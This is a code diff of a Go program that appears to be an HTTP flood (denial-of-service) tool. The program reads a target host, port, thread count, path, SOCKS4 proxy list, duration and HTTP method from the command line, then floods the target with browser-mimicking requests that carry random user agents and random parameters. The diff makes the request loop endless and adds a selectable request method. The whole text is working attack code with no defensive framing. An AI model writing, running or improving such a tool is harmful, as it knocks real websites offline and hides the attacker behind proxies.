@@ -115,9 +115,9 @@ func getUserAgents(number int) []string {
 	return userAgents
 }
 
-func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, _PATH string) {
+func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, _PATH string, _METHOD string) {
 	var conn net.Conn
-	_HEADER := "GET " + _PATH + randomParams() + " HTTP/1.1\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://www.google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
+	_HEADER := _METHOD + " " + _PATH + randomParams() + " HTTP/1.1\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://www.google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
 	_ADDRESS := _HOST + ":" + _PORT
 	// Dialer
 	dialer, err := proxyclient.NewProxyClient("socks4://" + _PROXY)
@@ -141,27 +141,28 @@ func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, 
 	}
 }
 
-func prepareRequests(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string, _PATH string) {
+func prepareRequests(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string, _PATH string, _METHOD string) {
 	_USERAGENT := _USERAGENTS[rand.Intn(len(_USERAGENTS))]
 	_PROXY := _PROXIES[rand.Intn(len(_PROXIES))]
-	for i := 0; i < 100; i++ {
-		makeRequests(_HOST, _PORT, _USERAGENT, _PROXY, _PATH)
+	for {
+		makeRequests(_HOST, _PORT, _USERAGENT, _PROXY, _PATH, _METHOD)
 	}
 }
 
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU())
+	runtime.GOMAXPROCS(4)
 	_USERAGENTS := getUserAgents(500)
 	_HOST := os.Args[1]
 	_PORT := os.Args[2]
 	_THREADS, _ := strconv.Atoi(os.Args[3])
-	var _PATH string = os.Args[4]
+	_PATH := os.Args[4]
 	_FILE := os.Args[5]
 	_PROXIES := readLines(_FILE)
 	_TIME, _ := strconv.Atoi(os.Args[6])
-	fmt.Print("Target: " + _HOST + "\n" + "Port: " + _PORT + "\n" + "Threads: " + strconv.Itoa(_THREADS) + "\n" + "Time: " + strconv.Itoa(_TIME) + "\n")
+	_METHOD := os.Args[7]
+	fmt.Print("Target: " + _HOST + "\n" + "Port: " + _PORT + "\n" + "Method: " + _METHOD + "\n" + "Threads: " + strconv.Itoa(_THREADS) + "\n" + "Time: " + strconv.Itoa(_TIME) + "\n")
 	for i := 0; i < _THREADS; i++ {
-		go prepareRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH)
+		go prepareRequests(_HOST, _PORT, _USERAGENTS, _PROXIES, _PATH, _METHOD)
 	}
 	time.Sleep(time.Duration(_TIME) * time.Second)
 }
